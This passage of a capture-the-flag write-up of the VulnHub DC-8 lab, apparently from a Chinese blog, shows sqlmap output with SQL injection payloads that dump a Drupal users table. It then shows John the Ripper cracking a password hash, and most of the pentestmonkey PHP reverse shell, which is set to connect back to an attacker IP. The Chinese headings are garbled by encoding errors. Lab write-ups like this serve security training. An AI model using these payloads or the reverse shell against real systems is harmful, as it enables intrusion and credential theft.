class="string">| sequences                   |</span></span><br><span class="line"><span class="string">| sessions                    |</span></span><br><span class="line"><span class="string">| shortcut_set                |</span></span><br><span class="line"><span class="string">| shortcut_set_users          |</span></span><br><span class="line"><span class="string">| site_messages_table         |</span></span><br><span class="line"><span class="string">| taxonomy_index              |</span></span><br><span class="line"><span class="string">| taxonomy_term_data          |</span></span><br><span class="line"><span class="string">| taxonomy_term_hierarchy     |</span></span><br><span class="line"><span class="string">| taxonomy_vocabulary         |</span></span><br><span class="line"><span class="string">| url_alias                   |</span></span><br><span class="line"><span class="string">| users                       |</span></span><br><span class="line"><span class="string">| users_roles                 |</span></span><br><span class="line"><span class="string">| variable                    |</span></span><br><span class="line"><span class="string">| views_display               |</span></span><br><span class="line"><span class="string">| views_view                  |</span></span><br><span class="line"><span class="string">| watchdog                    |</span></span><br><span class="line"><span class="string">| webform                     |</span></span><br><span class="line"><span class="string">| webform_component           |</span></span><br><span class="line"><span class="string">| webform_conditional         |</span></span><br><span class="line"><span class="string">| webform_conditional_actions |</span></span><br><span class="line"><span class="string">| webform_conditional_rules   |</span></span><br><span class="line"><span class="string">| webform_emails              |</span></span><br><span class="line"><span class="string">| webform_last_download       |</span></span><br><span class="line"><span class="string">| webform_roles               |</span></span><br><span class="line"><span class="string">| webform_submissions         |</span></span><br><span class="line"><span class="string">| webform_submitted_data      |</span></span><br><span class="line"><span class="string">+-----------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[20:59:55] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.3&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 20:59:55 /2020-08-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc8# </span></span><br></pre></td></tr></table></figure><h2 id="0x06-çˆ†å­—æ®µ"><a href="#0x06-çˆ†å­—æ®µ" class="headerlink" title="0x06.çˆ†å­—æ®µ"></a>0x06.çˆ†å­—æ®µ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># sqlmap -u &quot;http://192.168.1.3/?nid=2&quot; -D &quot;d7db&quot; -T &quot;users&quot; --columns</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 21:04:47 /2020-08-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[21:04:47] [INFO] resuming back-end DBMS &#x27;</span>mysql<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[21:04:47] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: nid (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND 2744=2744</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 3788 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(3788=3788,1))),0x716a6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: nid=2 AND (SELECT 8090 FROM (SELECT(SLEEP(5)))vgpi)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 1 column</span></span><br><span class="line"><span class="string">    Payload: nid=-6424 UNION ALL SELECT CONCAT(0x7162766b71,0x756e745669426f51657542734855636c72567a796d6a4f4f4642425451696b77557152776b6f616c,0x716a6a7671)-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] fetching columns for table &#x27;</span>users<span class="string">&#x27; in database &#x27;</span>d7db<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] retrieved: &#x27;</span>uid<span class="string">&#x27;,&#x27;</span>int(10) unsigned<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] retrieved: &#x27;</span>name<span class="string">&#x27;,&#x27;</span>varchar(60)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] retrieved: &#x27;</span>pass<span class="string">&#x27;,&#x27;</span>varchar(128)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] retrieved: &#x27;</span>mail<span class="string">&#x27;,&#x27;</span>varchar(254)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:47] [INFO] retrieved: &#x27;</span>theme<span class="string">&#x27;,&#x27;</span>varchar(255)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>signature<span class="string">&#x27;,&#x27;</span>varchar(255)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>signature_format<span class="string">&#x27;,&#x27;</span>varchar(255)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>created<span class="string">&#x27;,&#x27;</span>int(11)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>access<span class="string">&#x27;,&#x27;</span>int(11)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>login<span class="string">&#x27;,&#x27;</span>int(11)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>status<span class="string">&#x27;,&#x27;</span>tinyint(4)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>timezone<span class="string">&#x27;,&#x27;</span>varchar(32)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>language<span class="string">&#x27;,&#x27;</span>varchar(12)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>picture<span class="string">&#x27;,&#x27;</span>int(11)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>init<span class="string">&#x27;,&#x27;</span>varchar(254)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[21:04:48] [INFO] retrieved: &#x27;</span>data<span class="string">&#x27;,&#x27;</span>longblob<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Database: d7db                                                                                                                                   </span></span><br><span class="line"><span class="string">Table: users</span></span><br><span class="line"><span class="string">[16 columns]</span></span><br><span class="line"><span class="string">+------------------+------------------+</span></span><br><span class="line"><span class="string">| Column           | Type             |</span></span><br><span class="line"><span class="string">+------------------+------------------+</span></span><br><span class="line"><span class="string">| language         | varchar(12)      |</span></span><br><span class="line"><span class="string">| access           | int(11)          |</span></span><br><span class="line"><span class="string">| created          | int(11)          |</span></span><br><span class="line"><span class="string">| data             | longblob         |</span></span><br><span class="line"><span class="string">| init             | varchar(254)     |</span></span><br><span class="line"><span class="string">| login            | int(11)          |</span></span><br><span class="line"><span class="string">| mail             | varchar(254)     |</span></span><br><span class="line"><span class="string">| name             | varchar(60)      |</span></span><br><span class="line"><span class="string">| pass             | varchar(128)     |</span></span><br><span class="line"><span class="string">| picture          | int(11)          |</span></span><br><span class="line"><span class="string">| signature        | varchar(255)     |</span></span><br><span class="line"><span class="string">| signature_format | varchar(255)     |</span></span><br><span class="line"><span class="string">| status           | tinyint(4)       |</span></span><br><span class="line"><span class="string">| theme            | varchar(255)     |</span></span><br><span class="line"><span class="string">| timezone         | varchar(32)      |</span></span><br><span class="line"><span class="string">| uid              | int(10) unsigned |</span></span><br><span class="line"><span class="string">+------------------+------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[21:04:48] [INFO] fetched data logged to text files under &#x27;</span>/root/.<span class="built_in">local</span>/share/sqlmap/output/192.168.1.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 21:04:48 /2020-08-30/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc8# </span></span><br></pre></td></tr></table></figure><h2 id="0x06-çˆ†æ•°æ®ï¼Œä½†æ˜¯æ˜¯hashçš„"><a href="#0x06-çˆ†æ•°æ®ï¼Œä½†æ˜¯æ˜¯hashçš„" class="headerlink" title="0x06.çˆ†æ•°æ®ï¼Œä½†æ˜¯æ˜¯hashçš„"></a>0x06.çˆ†æ•°æ®ï¼Œä½†æ˜¯æ˜¯hashçš„</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># sqlmap -u &quot;http://192.168.1.3/?nid=2&quot; -D &quot;d7db&quot; -T &quot;users&quot; -C &quot;name,pass&quot; --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [<span class="string">&#x27;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 21:06:17 /2020-08-30/</span><br><span class="line"></span><br><span class="line">[21:06:17] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[21:06:17] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: nid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: nid=2 AND 2744=2744</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: nid=2 AND (SELECT 3788 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(3788=3788,1))),0x716a6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: nid=2 AND (SELECT 8090 FROM (SELECT(SLEEP(5)))vgpi)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 1 column</span><br><span class="line">    Payload: nid=-6424 UNION ALL SELECT CONCAT(0x7162766b71,0x756e745669426f51657542734855636c72567a796d6a4f4f4642425451696b77557152776b6f616c,0x716a6a7671)-- -</span><br><span class="line">---</span><br><span class="line">[21:06:17] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span><br><span class="line">[21:06:17] [INFO] fetching entries of column(s) <span class="string">&#x27;name, pass&#x27;</span> <span class="keyword">for</span> table <span class="string">&#x27;users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;d7db&#x27;</span></span><br><span class="line">[21:06:17] [INFO] retrieved: <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line">[21:06:18] [INFO] retrieved: <span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z&#x27;</span></span><br><span class="line">[21:06:18] [INFO] retrieved: <span class="string">&#x27;john&#x27;</span>,<span class="string">&#x27;$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF&#x27;</span></span><br><span class="line">Database: d7db                                                                                                                                   </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| name  | pass                                                    |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line">| admin | <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span> |</span><br><span class="line">| john  | <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span>/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+-------+---------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">[21:06:18] [INFO] table <span class="string">&#x27;d7db.users&#x27;</span> dumped to CSV file <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.1.3/dump/d7db/users.csv&#x27;</span></span><br><span class="line">[21:06:18] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.1.3&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 21:06:18 /2020-08-30/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x07-johnè§£è¿·"><a href="#0x07-johnè§£è¿·" class="headerlink" title="0x07.johnè§£è¿·"></a>0x07.johnè§£è¿·</h2><p><code>å…ˆç”Ÿæˆå­—å…¸</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># cat user.dic </span></span><br><span class="line">admin:<span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span></span><br><span class="line">john:<span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span>/3if/oRVZJaz5mKC2vF</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>è§£å¯†ï¼Œjohnçš„å¯†ç ä¸ºturtle</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># john user.txt /usr/share/wordlists/rockyou.txt</span></span><br><span class="line">Â·Â·Â·</span><br><span class="line">æ­¤å¤„çœç•¥nè¡Œ</span><br><span class="line">Â·Â·Â·</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment"># john user.txt /usr/share/wordlists/rockyou.txt --show</span></span><br><span class="line">john:turtle</span><br><span class="line">Session aborted</span><br><span class="line">root@JIYE:~/vulnhub/dc8<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x08-ç™»å…¥"><a href="#0x08-ç™»å…¥" class="headerlink" title="0x08.ç™»å…¥"></a>0x08.ç™»å…¥</h2><p><code>æ‰¾äº†ä¸€åœˆå‘ç°å¯ä»¥å†™PHPä»£ç </code></p><img src="/2020/08/31/DC-8/image-20200831095038841.png" class><h2 id="0x09-åå¼¹shell"><a href="#0x09-åå¼¹shell" class="headerlink" title="0x09.åå¼¹shell"></a>0x09.åå¼¹shell</h2><p><code>æœ¬æ¬¡ä½¿ç”¨/usr/share/webshells/php/php-reverse-shell.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation <span class="keyword">in</span> PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// <span class="keyword">for</span> damage caused by this tool.  If these terms are not acceptable to you, <span class="keyword">then</span></span><br><span class="line">// <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License along</span><br><span class="line">// with this program; <span class="keyword">if</span> not, write to the Free Software Foundation, Inc.,</span><br><span class="line">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="line">//</span><br><span class="line">// This tool may be used <span class="keyword">for</span> legal purposes only.  Users take full responsibility</span><br><span class="line">// <span class="keyword">for</span> any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="line">// you, <span class="keyword">then</span> <span class="keyword">do</span> not use this tool.</span><br><span class="line">//</span><br><span class="line">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="line">// me at pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// Description</span><br><span class="line">// -----------</span><br><span class="line">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="line">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="line">//</span><br><span class="line">// Limitations</span><br><span class="line">// -----------</span><br><span class="line">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="line">// Use of stream_select() on file descriptors returned by proc_open() will fail and <span class="built_in">return</span> FALSE under Windows.</span><br><span class="line">// Some compile-time options are needed <span class="keyword">for</span> daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="line">//</span><br><span class="line">// Usage</span><br><span class="line">// -----</span><br><span class="line">// See http://pentestmonkey.net/tools/php-reverse-shell <span class="keyword">if</span> you get stuck.</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.1.6&#x27;</span>;  // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 1234;       // CHANGE THIS</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself <span class="keyword">if</span> possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">        // Fork and have the parent process <span class="built_in">exit</span></span><br><span class="line">        <span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span> == -1) &#123;</span><br><span class="line">                printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">                <span class="built_in">exit</span>(0);  // Parent exits</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Make the current process a session leader</span><br><span class="line">        // Will only succeed <span class="keyword">if</span> we forked</span><br><span class="line">        <span class="keyword">if</span> (posix_setsid() == -1) &#123;</span><br><span class="line">                printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$daemon</span> = 1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line"><span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">// Remove any <span class="built_in">umask</span> we inherited</span><br><span class="line"><span class="built_in">umask</span>(0);</span><br><span 